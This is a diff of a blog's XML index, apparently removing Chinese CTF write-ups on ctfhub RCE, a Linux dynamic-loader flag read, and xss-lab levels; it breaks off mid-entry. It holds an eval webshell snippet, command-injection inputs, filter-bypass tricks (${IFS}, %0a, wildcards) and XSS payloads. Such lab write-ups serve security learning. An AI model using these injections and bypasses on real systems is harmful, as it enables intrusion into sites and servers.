@@ -428,146 +428,6 @@ AddHandler cgi-script .cgi   <span aria-hidden="true" class="line-numbers-rows">
       </tags>
   </entry>
   <entry>
-    <title>ctfhub-rce</title>
-    <url>/2022/11/ctfhub-rce/</url>
-    <content><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行ping和远程代码执行evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞</strong>。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
-<h1 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>传参给cmd来eval</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处因为根目录无flag 所以看上一级目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>找到后 再cat &#x2F;flag_****</p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>这里使用strpos函数</p>
-<blockquote>
-<p>strpos:查找字符串首次出现的位置</p>
-<p>int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</p>
-</blockquote>
-<p>题目使用</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//无flag字符即可运行</span>
-    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>来包含文件，而下方给出的shell.txt含有eval漏洞</p>
-<p>于是包含它（shell.txt没有“flag”字符 所以这里strpos没影响）</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218182857507.png" alt="image-20220218182857507"></p>
-<p>通过get(包含文件) post(传参)并用来得到flag</p>
-<h1 id="php-info"><a href="#php-info" class="headerlink" title="php info"></a>php info</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
-if (isset($_GET[&#39;file&#39;]))&#123;  
-	if ( substr($_GET[&quot;file&quot;], 0, 6) &#x3D;&#x3D;&#x3D; &quot;php:&#x2F;&#x2F;&quot; ) &#123;
-        include($_GET[&quot;file&quot;]);  
-         &#125;
-    else &#123; 
-        echo &quot;Hacker!!!&quot;;
-    	&#125;&#125;
-else &#123;
-    highlight_file(__FILE__);&#125;?&gt;
-&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;&lt;a href&#x3D;&quot;phpinfo.php&quot;&gt;phpinfo&lt;&#x2F;a&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>点击phpinfo链接 可查看php环境</p>
-<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;*php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）
-
-PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。  
-
-php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218162728184.png" alt="image-20220218162728184"></p>
-<h1 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h1><p>看环境 无法使用php:&#x2F;&#x2F;input</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
-error_reporting<span class="token punctuation">(</span>E_ALL<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> substr<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span>, <span class="token number">0</span>, <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token string">"php://"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        include<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-        <span class="token builtin class-name">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>但还必须是php:&#x2F;&#x2F;开头</p>
-<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;filter</a></h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219174206504.png" alt="image-20220219174206504"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219112308277.png" alt="image-20220219112308277"></p>
-<h1 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h1><p>同phpinfo做法相同</p>
-<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>输入命令</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>然后cat时出现了问题</p>
-<p>输出被限制了</p>
-<p>于是用管道符号来限制输出base64</p>
-<p>得到后再解码</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218170811553.png" alt="image-20220218170811553"></p>
-<h1 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h1><pre class="line-numbers language-php+html" data-language="php+html"><code class="language-php+html">&lt;?php
-$res &#x3D; FALSE;
-if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
-    $ip &#x3D; $_GET[&#39;ip&#39;];
-    $m &#x3D; [];
-    if (!preg_match_all(&quot;&#x2F;cat&#x2F;&quot;, $ip, $m)) &#123;&#x2F;&#x2F;过滤了cat
-        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;
-        exec($cmd, $res);
-    &#125; 
-    else &#123;
-        $res &#x3D; $m;
-    &#125;
-&#125;
-?&gt;
-
-&lt;pre&gt;
-&lt;?php
-    if ($res) &#123;
-        print_r($res);
-    &#125;
-?&gt;
-&lt;&#x2F;pre&gt;
-&lt;?php
-	show_source(__FILE__);
-?&gt;
-&lt;&#x2F;body&gt;
-&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h1 id="more"><a href="#more" class="headerlink" title="more"></a>more</h1><p>Linux more 命令类似 cat  ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b  键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>
-<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">more [-dlfpcsu] [-num] [+/pattern] [+linenum] [fileNames..]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171602745.png" alt="image-20220218171602745"></p>
-<h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p>在linux里空格可用&lt; 或 ${IFS}代替</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171910282.png" alt="image-20220218171910282"></p>
-<h1 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h1><p>cat [file]|base64还可以用base64 [file]</p>
-<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
-$res &#x3D; FALSE;
-if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
-    $ip &#x3D; $_GET[&#39;ip&#39;];
-    $m &#x3D; [];
-    if (!preg_match_all(&quot;&#x2F;(\||\&amp;)&#x2F;&quot;, $ip, $m)) &#123;
-        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;
-        exec($cmd, $res);
-    &#125; else &#123;
-        $res &#x3D; $m;
-    &#125;
-&#125;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219104650896.png" alt="image-20220219104650896"></p>
-<h1 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>;可以用%0a(url编码)	cat用base64	flag用正则f***    *lag等	空格用 ${IFS}</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219105932534.png" alt="image-20220219105932534"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110644693.png" alt="image-20220219110644693"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110736333.png" alt="image-20220219110736333"></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>rce</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow黑盒测试</title>
     <url>/2022/11/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h1 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h1><p>先看源码没发现啥</p>
@@ -792,42 +652,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
-    <title>linux动态加载</title>
-    <url>/2022/11/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[<h2 id="linux动态加载"><a href="#linux动态加载" class="headerlink" title="linux动态加载"></a>linux动态加载</h2><h1 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h1><p>先给了755<br>他自己传了flag 等于告诉我们在哪了<br>然后限到了644<br>不想让我们直接看</p>
-<blockquote>
-<p>都到这一题了权限应该不用讲了</p>
-</blockquote>
-<p>提示给了shell<br>且不需要提权<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a694c0aa89c24d1ba00256e97cefd34b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
-<h1 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h1><h2 id="elf文件"><a href="#elf文件" class="headerlink" title="elf文件"></a>elf文件</h2><p>elf文件是linux下的可执行文件<br>文件头为elf</p>
-<blockquote>
-<p>不知道是靶机还是蚁剑虚拟终端的问题 没法vi<br>直接cat就能看到了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/14c42167ec0745548b280beb335e12b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-</blockquote>
-<h2 id="动态库链接器-x2F-加载器"><a href="#动态库链接器-x2F-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h2><ul>
-<li>当需要动态链接的应用被操作系统加载时</li>
-<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
-<li>在Linux环境下，这项工作是由ld-linux.so.2来负责完成的</li>
-<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
-<li>而不是交给程序正常的进入地址</li>
-<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
-</ul>
-<h2 id="ldd命令"><a href="#ldd命令" class="headerlink" title="ldd命令"></a>ldd命令</h2><p>使用ldd命令即可查看<br>简便的shell命令依赖哪些动态加载库<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/67a17bc7a0144be2a741e537f7ab2380.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><p>在cat elf文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在ldd<br>可以看到ls 和 cat动用他了<br>用！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/e49dc243bc714d2e95cb5223b895599e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 &#x2F;readflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>get</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>linux</tag>
-        <tag>动态加载</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfhub-jwt</title>
     <url>/2022/11/jwt/</url>
     <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">jwt基础知识</a></p>
@@ -926,49 +750,179 @@ sig <span class="token operator">=</span> base64<span class="token punctuation">
       </tags>
   </entry>
   <entry>
-    <title>xss-lab</title>
-    <url>/2022/11/xsslab/</url>
-    <content><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>没啥好说的<br>直接alert<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7cff66907f234fe8a9264319b7fcb8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-//改后是
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……>//
-1111"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……这是输入的部分
-前后闭合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/1e4c13e4bc1d4537880deaf36855ab42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用了htmlspeialchars()函数	&lt;&gt;”都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7c28fa1a02bd4383ac5f0cb8df3f3f95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">二者都写可以</p>
-<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>和上面一样</p>
-<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>on 和 script都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/ec2a556e55ba4c9b84c5a07d3aedff9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这里用javascript:伪协议<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3d92413c5c624059aab10d022aefcf04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">出来的链接就是答案</p>
-<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>可以大小写绕过</p>
-<h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>把特殊字符便空了<br>可以双写绕过</p>
-<h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>这关卡的死死的<br>要编码绕过<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d233b7b1bba44b50b4aeeab90330e7e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<h1 id="level-9"><a href="#level-9" class="headerlink" title="level  9"></a>level  9</h1><p>strpos函数看是否有http:&#x2F;&#x2F;<br>验证是否为安全连接<br>但是没有限定位置<br>要编码下<br>还要把http:&#x2F;&#x2F;放最后面用&#x2F;&#x2F;注释掉<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/9d5db481746d4a9f95e8001a62ccd7bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level 10-13"></a>level 10-13</h1><p>页面没有注入点<br>看源代码发现隐藏的表单<br>要改为文本框text</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css">type=<span class="token string">"text"</span> onclick=<span class="token string">"alert(1)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>后面几关都要改t_sort<br>因为后端获取t_sort和user-agent等<br>要从相应注入点注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/2040ace8d49d4257a8553820b103ff93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><blockquote>
-<p>exif xss漏洞，exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p>
-<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br>甚至有些照片能看到经纬度<br>这关要用到<br><a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br>但是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b0ccd08d54844a0ab8326ecdebed2497.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a28e85a7ace44b67a82fb0f28009f4a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-</blockquote>
-<h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>对script、&#x2F;、空格进行了转换<br>空格不可以就用换行符</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css">&lt;a%0atype=<span class="token string">"text"</span>%0a<span class="token string">"alert"</span>><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17-18"></a>level 17-18</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3636897a078a4392a3d629c6eabb3715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>火狐不支持swf格式<br>把链接加网页上显示出这样<br>很奇怪<br>开始整套娃了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b402d2307f0f45baacade379e596da50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p>要找个支持flash的浏览器才能正常打开<br>17-20关都能用flash xss<br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br>但这里先用别的办法<br>以18关为例<br>注入点可以在arg02<br>但是你连swf都没有哪来的moouseover哪<br>所以得url连接一下</p>
